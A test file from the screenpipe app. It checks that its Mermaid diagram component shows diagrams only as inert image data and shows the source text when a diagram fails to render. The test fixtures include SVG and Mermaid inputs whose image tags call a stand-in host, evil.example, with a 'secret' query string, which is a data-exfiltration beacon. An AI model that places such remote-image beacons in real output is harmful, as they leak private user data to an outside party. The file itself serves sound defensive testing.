// screenpipe — AI that knows everything you've seen, said, or heard
// https://screenpipe.com

import React from "react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { render, screen } from "@testing-library/react";

const renderMermaidSvgMock = vi.hoisted(() => vi.fn());

vi.mock("@/components/rewind/mermaid-sandbox", () => ({
  renderMermaidSvg: renderMermaidSvgMock,
}));

import { MermaidDiagram } from "@/components/rewind/mermaid-diagram";

// What a steered diagram can come back with: a remote image in a label.
const SVG_WITH_REMOTE_IMAGE =
  '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">' +
  '<image href="https://evil.example/shape.png?d=secret" width="10" height="10"/>' +
  '<foreignObject width="200" height="100"><div xmlns="http://www.w3.org/1999/xhtml">' +
  '<img src="https://evil.example/label.png?d=secret"/> Capture</div></foreignObject></svg>';

describe("MermaidDiagram", () => {
  afterEach(() => {
    renderMermaidSvgMock.mockReset();
  });

  it("shows the diagram as an image, never as live markup in the app", async () => {
    renderMermaidSvgMock.mockResolvedValue({ svg: SVG_WITH_REMOTE_IMAGE, text: "Capture" });

    const { container } = render(<MermaidDiagram chart={"  flowchart LR\n  A --> B  "} />);

    // The diagram's own text stays available to screen readers.
    const image = await screen.findByRole("img", { name: "Diagram: Capture" });
    expect(image.getAttribute("src")).toMatch(/^data:image\/svg\+xml;charset=utf-8,%3Csvg/);
    expect(decodeURIComponent(image.getAttribute("src")!)).toContain("Capture");
    expect(renderMermaidSvgMock).toHaveBeenCalledWith(
      "flowchart LR\n  A --> B",
      expect.objectContaining({ theme: "base" }),
    );

    // The remote URLs exist only inside the inert image data.
    expect(container.querySelectorAll("svg, foreignObject, image")).toHaveLength(0);
    expect(container.querySelectorAll("img")).toHaveLength(1);
    expect(decodeURIComponent(image.getAttribute("src")!)).toContain("https://evil.example/label.png");
    image.removeAttribute("src");
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("shows the source when the diagram cannot be drawn", async () => {
    renderMermaidSvgMock.mockRejectedValue(new Error("The source image cannot be decoded."));
    vi.spyOn(console, "error").mockImplementation(() => {});

    render(<MermaidDiagram chart={'flowchart TD\n  A@{ img: "https://evil.example/x.png" }'} />);

    expect(await screen.findByText("Diagram error:")).toBeInTheDocument();
    expect(screen.getByText(/A@\{ img:/)).toBeInTheDocument();
    expect(screen.queryByRole("img")).toBeNull();
  });
});
